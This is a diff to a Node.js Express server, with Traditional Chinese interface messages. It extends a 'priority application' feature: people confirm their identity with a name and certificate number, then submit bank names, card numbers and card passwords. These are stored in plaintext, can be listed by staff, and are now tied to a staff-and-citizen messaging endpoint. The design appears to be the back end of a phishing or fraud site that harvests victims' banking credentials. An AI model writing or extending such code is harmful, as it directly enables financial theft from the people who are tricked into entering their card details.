@@ -9,6 +9,7 @@ const bcrypt = require('bcryptjs');
 const Database = require('better-sqlite3');
 const { Server } = require('socket.io');
 const { RtcRole, RtcTokenBuilder } = require('agora-token');
+const { appendPriorityMessage, priorityEntriesFromInput, publicPriorityApplication } = require('./api/_lib/service');
 
 const app = express();
 const server = http.createServer(app);
@@ -329,17 +330,19 @@ function certificateCases(citizenName, certificateNumber) {
   `).all(citizenName, certificateNumber);
 }
 
-function publicPriorityApplication(row) {
-  if (!row) return null;
-  let entries = [];
-  try { entries = JSON.parse(row.entries_json || '[]'); } catch (_) { entries = []; }
-  return {
-    id: row.id,
-    citizenName: row.citizen_name,
-    certificateNumber: row.certificate_number,
-    entries,
-    createdAt: row.created_at
-  };
+function readPriorityApplications(sql, params = []) {
+  return db.prepare(sql).all(...params).map((row) => {
+    const application = publicPriorityApplication(row);
+    const serialized = JSON.stringify(application.entries);
+    if (serialized !== (row.entries_json || '[]')) {
+      db.prepare('UPDATE priority_applications SET entries_json = ? WHERE id = ?').run(serialized, row.id);
+    }
+    return application;
+  });
+}
+
+function savePriorityEntries(applicationId, entries) {
+  db.prepare('UPDATE priority_applications SET entries_json = ? WHERE id = ?').run(JSON.stringify(entries), applicationId);
 }
 
 app.get('/api/me', (req, res) => {
@@ -406,26 +409,68 @@ app.post('/api/citizen/logout', (req, res) => {
 });
 
 app.get('/api/priority-applications', requireStaff, (_req, res) => {
-  const rows = db.prepare('SELECT * FROM priority_applications ORDER BY created_at DESC').all();
-  res.json({ applications: rows.map(publicPriorityApplication) });
+  res.json({ applications: readPriorityApplications('SELECT * FROM priority_applications ORDER BY created_at DESC') });
+});
+
+function priorityIdentity(body) {
+  const citizenName = String(body.citizenName || '').trim();
+  const certificateNumber = normalizeCertificateNumber(body.certificateNumber);
+  if (citizenName.length < 2 || certificateNumber.length < 3) return { error: '請輸入姓名與證號', status: 400 };
+  if (!certificateCases(citizenName, certificateNumber).length) return { error: '查無資料', status: 404 };
+  return { citizenName, certificateNumber };
+}
+
+app.post('/api/priority-applications/lookup', (req, res) => {
+  const identity = priorityIdentity(req.body || {});
+  if (identity.error) return res.status(identity.status).json({ error: identity.error });
+  const applications = readPriorityApplications(
+    'SELECT * FROM priority_applications WHERE citizen_name = ? AND certificate_number = ? ORDER BY created_at DESC',
+    [identity.citizenName, identity.certificateNumber]
+  );
+  res.json({ applications });
+});
+
+app.post('/api/priority-applications/messages', (req, res) => {
+  const body = req.body || {};
+  const entryId = String(body.entryId || '');
+  const text = String(body.body || '').trim();
+  if (!text) return res.status(400).json({ error: '請輸入訊息' });
+  const citizenRequest = Boolean(String(body.citizenName || '').trim() || String(body.certificateNumber || '').trim());
+  let rows = [];
+  let role = 'staff';
+  if (citizenRequest) {
+    const identity = priorityIdentity(body);
+    if (identity.error) return res.status(identity.status).json({ error: identity.error });
+    rows = readPriorityApplications(
+      'SELECT * FROM priority_applications WHERE citizen_name = ? AND certificate_number = ? ORDER BY created_at DESC',
+      [identity.citizenName, identity.certificateNumber]
+    );
+    role = 'citizen';
+  } else if (req.session.user) {
+    rows = readPriorityApplications('SELECT * FROM priority_applications ORDER BY created_at DESC');
+  } else {
+    return res.status(401).json({ error: '請先登入' });
+  }
+  for (const application of rows) {
+    const result = appendPriorityMessage(application.entries, entryId, role, text);
+    if (!result.error) {
+      savePriorityEntries(application.id, result.entries);
+      return res.json({ application: publicPriorityApplication(db.prepare('SELECT * FROM priority_applications WHERE id = ?').get(application.id)) });
+    }
+  }
+  res.status(404).json({ error: role === 'staff' ? '找不到這筆申請' : '查無資料' });
 });
 
 app.post('/api/priority-applications', (req, res) => {
-  const citizenName = String(req.body.citizenName || '').trim();
-  const certificateNumber = normalizeCertificateNumber(req.body.certificateNumber);
-  const entries = Array.isArray(req.body.entries) ? req.body.entries.map((entry) => ({
-    bank: String(entry?.bank || '').trim(),
-    cardNumber: String(entry?.cardNumber || '').trim(),
-    password: String(entry?.password || '').trim()
-  })).filter((entry) => entry.bank || entry.cardNumber || entry.password) : [];
-  if (citizenName.length < 2 || certificateNumber.length < 3) return res.status(400).json({ error: '請輸入姓名與證號' });
-  if (!certificateCases(citizenName, certificateNumber).length) return res.status(404).json({ error: '查無資料' });
+  const identity = priorityIdentity(req.body || {});
+  if (identity.error) return res.status(identity.status).json({ error: identity.error });
+  const entries = priorityEntriesFromInput(req.body.entries);
   if (!entries.length) return res.status(400).json({ error: '請至少填寫一筆銀行別、卡號或密碼' });
   const appId = id();
   db.prepare(`
     INSERT INTO priority_applications (id, citizen_name, certificate_number, entries_json, created_at)
     VALUES (?, ?, ?, ?, ?)
-  `).run(appId, citizenName, certificateNumber, JSON.stringify(entries), now());
+  `).run(appId, identity.citizenName, identity.certificateNumber, JSON.stringify(entries), now());
   res.json({ application: publicPriorityApplication(db.prepare('SELECT * FROM priority_applications WHERE id = ?').get(appId)) });
 });
 
